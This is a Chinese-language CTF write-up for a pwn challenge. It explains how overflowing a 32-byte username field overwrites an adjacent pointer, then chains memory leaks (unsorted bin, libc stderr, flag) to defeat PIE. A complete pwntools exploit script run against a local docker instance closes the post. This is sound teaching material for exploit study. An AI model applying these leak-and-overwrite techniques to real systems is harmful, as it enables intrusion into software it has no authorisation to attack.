---
title: "W&MCTF pwn writeups"
date: "2024-04-01"
author: ["Y4ng"]
keywords: 
- PWN
- writeups
- ctf
categories: 
- writeups
tags: 
- PWN
- writeups
- ctf
description: "抛开libc不谈，调偏移就是耍流氓😣"
weight:
slug: ""
draft: false # 是否为草稿
comments: true
reward: true # 打赏
mermaid: false # 是否开启mermaid
showToc: true # 显示目录
TocOpen: true # 自动展开目录
hidemeta: false # 是否隐藏文章的元信息，如发布日期、作者等
disableShare: true # 底部不显示分享栏
showbreadcrumbs: true # 顶部显示路径
cover:
    image: "title.png" # 图片路径：posts/tech/123/123.png
    hidden: true
---

![image1](title.png)
## 题目分析

竟然给了源码0.0，直接开看！！！

flag以全局变量存在bss段中

![image](2.png)

checksec一下果然开了PIE.......

![image](3.png)

继续看源码，建立了一个结构体，并将成员分别输出

![image](4.png)

结构体如下

```c
typedef struct {
    char username[32];
    char *description;
} User;
```

漏洞点在于第一个read语句，对username的读入会覆盖掉description，可以打开pwndbg看结构体在内存上的分布

![image](5.png)

username占0x20，却可以读入0x28个字节，将0x55555555c5f0（description）给覆盖，之后在将description给输出时，有一个任意内存泄露

想到这，我们就可以通过泄露的方式将flag给读出

## 漏洞利用

由于开了PIE，低三位是不变的，先看看flag的地址

![image](6.png)

第三位是0X0C0，由于没有内存直接指向flag，先看看周围的内存空间，发现flag上面有std_err

![image](7.png)

一般libc中都会有内存指向std_err，所以在libc中搜索一下，果然发现了

![image](8.png)

由于libc中偏移是固定的，所以现在只需要泄露个libc地址就ok了，在堆附近可以看到有一个unsorted bin，泄露出它的fd就行了

![image](9.png)

![image](10.png)

总结，我们的leak路线就是unsorted_bin.fd-----> stderr-------->flag

泄露FD上的libc是1/16的几率爆破

由于远程偏移不一样，我们开一个docker容器将里面的libc和ld给拿出来

```bash
sudo docker run -p 5000:5000 --privileged $(sudo docker build -q .)
```

之后就是让人崩溃的偏移调试。。。。最终偏移是通过泄露出了附近的地址手动确定的

## exp

```python
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug',timeout=0.5)
binary_path = './leakleakleak'
libc_path = './libc.so.6'

elf = ELF(binary_path)
#leak_addr = lambda name,addr: log.success(f'{name}----->'+hex(addr))
#main_arena_offset = libc.symbols["__malloc_hook"] + 0x10

def debug():
    gdb.attach(p)
    pause()

#"0x7fe8c7a74848"
while(True):
    try:
        p = remote("127.0.0.1", 5000) 
        p.recvuntil(b'What is your name? ')
        payload = b'a'*32+b'\x10\xa7'
        #debug()
        p.send(payload)
        p.recvuntil(b'Let me tell you something about yourself! :3\n')
        addr = u64(p.recvuntil(b'\x7f').ljust(8,b'\x00'))
        log.success("libc--->" + hex(addr))
        std_err = addr - 0xe38
        p.recvuntil(b'Continue? (Y/n) ')
        p.sendline(b'Y')
        #second
        p.recvuntil(b'What is your name? ')
        payload = b'a'*32+p64(std_err)
        p.send(payload)
        p.recvuntil(b'Let me tell you something about yourself! :3\n')
        flag_addr = u64(p.recvuntil(b'\n',drop=True).ljust(8,b'\x00')) + 0x20
        log.success("flag_addr--->"+hex(flag_addr))
        p.recvuntil(b'Continue? (Y/n) ')
        p.sendline(b'Y')
        #third
        log.success("libc--->" + hex(addr))
        log.success("stderr-->" + hex(std_err))
        log.success("flag_addr--->"+hex(flag_addr))
        p.recvuntil(b'What is your name? ')
        p.send(payload)
        payload = b'a'*32+p64(flag_addr)
        p.send(payload)
        p.interactive()
    except:
        p.close()
```